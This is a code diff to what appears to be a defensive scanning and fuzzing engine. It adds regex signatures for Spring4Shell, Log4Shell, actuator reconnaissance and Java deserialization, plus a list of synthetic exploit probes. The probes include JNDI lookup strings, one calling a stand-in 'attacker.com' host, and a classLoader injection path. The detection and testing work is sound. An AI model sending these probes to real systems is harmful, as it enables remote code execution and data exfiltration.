@@ -82,7 +82,11 @@ DEFAULT_THREAT_PATTERNS = [
     ThreatPatternSignature("CVE-2024-4367", "Font/PDF Remote Arbitrary Code Execution", "CRITICAL", r"(?i)\/type1font|\/cidfont|\.pdf"),
     ThreatPatternSignature("SSRF-CLOUD-METADATA", "AWS/GCP Link-Local Metadata Probe", "CRITICAL", r"169\.254\.169\.254|metadata\.google"),
     ThreatPatternSignature("SUPPLY-CHAIN-LITELLM", "Rogue Typosquat LiteLLM Proxy Injection", "HIGH", r"(?i)litellm_proxy|litellm_admin"),
-    ThreatPatternSignature("OOM-DECOMPRESSION-BOMB", "Extreme Pixel Dimension Decompression Bomb", "HIGH", r"(?i)pixel_limit|max_pixels|decompressionbomb")
+    ThreatPatternSignature("OOM-DECOMPRESSION-BOMB", "Extreme Pixel Dimension Decompression Bomb", "HIGH", r"(?i)pixel_limit|max_pixels|decompressionbomb"),
+    ThreatPatternSignature("CVE-2022-22965", "Spring4Shell ClassLoader Manipulation RCE", "CRITICAL", r"(?i)class\.module\.classLoader|classLoader\.resources"),
+    ThreatPatternSignature("CVE-2021-44228", "Log4Shell Java JNDI Remote Code Execution", "CRITICAL", r"(?i)\$\{jndi:(?:ldap|rmi|dns|ldaps|iiop)"),
+    ThreatPatternSignature("SPRING-ACTUATOR-RECON", "Spring Boot Actuator Reconnaissance Probe", "HIGH", r"(?i)\/actuator\/(?:env|gateway|heapdump|beans|restart)"),
+    ThreatPatternSignature("JAVA-DESERIALIZATION-RCE", "Java Object Deserialization Magic Bytes Injection", "CRITICAL", r"(?i)rO0AB[A-Za-z0-9+/=]|\xac\xed\x00\x05")
 ]
 
 class SecurityAdaptiveRAMCache:
@@ -311,7 +315,8 @@ class ContinuousSecurityTrainingEngine:
             "ssrf_mutations": 0,
             "upload_mutations": 0,
             "data_theft_mutations": 0,
-            "memory_payload_mutations": 0
+            "memory_payload_mutations": 0,
+            "spring_java_rce_mutations": 0
         }
 
         # 1. Synthetic SSRF Mutations (IP Obfuscation, Octal, Hex, Cloud Metadata, Insecure Schemes)
@@ -384,6 +389,28 @@ class ContinuousSecurityTrainingEngine:
             valid, _ = black_october_guard.memory_governor.validate_payload_size(sz)
             fuzzing_categories["memory_payload_mutations"] += 1
             if not valid:  # valid==False means blocked
+                blocked_count += 1
+            else:
+                escaped_count += 1
+
+        # 5. Synthetic Java SE & Spring Framework RCE Probes (Spring4Shell, Log4Shell, Actuator, Deserialization)
+        import re
+        rce_patterns = [re.compile(p.pattern) for p in DEFAULT_THREAT_PATTERNS if any(k in p.name for k in ("Spring", "Java", "Log4j"))]
+        spring_java_synthetic_payloads = [
+            "/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=shell",
+            "${jndi:ldap://127.0.0.1:1389/Exploit}",
+            "${jndi:rmi://10.0.0.1/a}",
+            "${jndi:dns://attacker.com/leak}",
+            "/actuator/env",
+            "/actuator/heapdump",
+            "/actuator/gateway/routes",
+            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAU=",
+            "\xac\xed\x00\x05sr\x00\x11java.util.HashMap"
+        ]
+        for p in spring_java_synthetic_payloads:
+            fuzzing_categories["spring_java_rce_mutations"] += 1
+            is_blocked = any(rx.search(p) for rx in rce_patterns)
+            if is_blocked:
                 blocked_count += 1
             else:
                 escaped_count += 1
